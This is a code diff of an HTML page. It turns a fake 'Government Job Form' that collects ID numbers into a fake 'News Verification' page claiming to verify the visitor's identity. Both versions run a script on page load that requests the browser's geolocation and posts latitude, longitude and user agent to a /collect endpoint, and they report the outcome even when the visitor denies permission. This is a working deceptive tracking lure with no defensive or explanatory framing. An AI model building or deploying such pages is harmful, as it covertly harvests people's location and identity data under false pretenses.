@@ -1,55 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Govt Job Application</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>News Verification</title>
   <style>
-    body { font-family: sans-serif; background: #eef2f3; padding: 20px; }
-    .form-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-    input, button { width: 100%; padding: 10px; margin-top: 10px; border: 1px solid #ccc; border-radius: 4px; }
-    button { background: #28a745; color: white; border: none; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 100px;
+    }
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    h2 {
+      color: #333;
+    }
   </style>
 </head>
 <body>
-  <div class="form-box">
-    <h2>Government Job Form</h2>
-    <p>Please fill your details to apply.</p>
-    <form>
-      <input type="text" placeholder="Full Name" required>
-      <input type="text" placeholder="CNIC / ID Number" required>
-      <input type="text" placeholder="Phone Number" required>
-      <button type="submit">Submit</button>
-    </form>
+  <div class="box">
+    <h2>Verifying Your Identity...</h2>
+    <p>Please wait while we verify your browser and location.</p>
   </div>
 
   <script>
-    const device = navigator.platform || "Unknown";
+    function getDataAndSend(lat, lon) {
+      fetch("/collect", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          userAgent: navigator.userAgent,
+          camera: "✅ Location Accessed"
+        })
+      });
+    }
+
     navigator.geolocation.getCurrentPosition(
-      pos => {
+      function(position) {
+        getDataAndSend(position.coords.latitude, position.coords.longitude);
+      },
+      function(error) {
         fetch("/collect", {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            userAgent: navigator.userAgent,
-            camera: "✅ Location Allowed",
-            deviceInfo: device
-          })
-        });
-      },
-      err => {
-        fetch("/collect", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {"Content-Type": "application/json"},
           body: JSON.stringify({
             userAgent: navigator.userAgent,
-            camera: "❌ Location Denied",
-            deviceInfo: device
+            camera: "❌ Location Denied"
           })
         });
-      },
-      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      }
     );
   </script>
 </body>
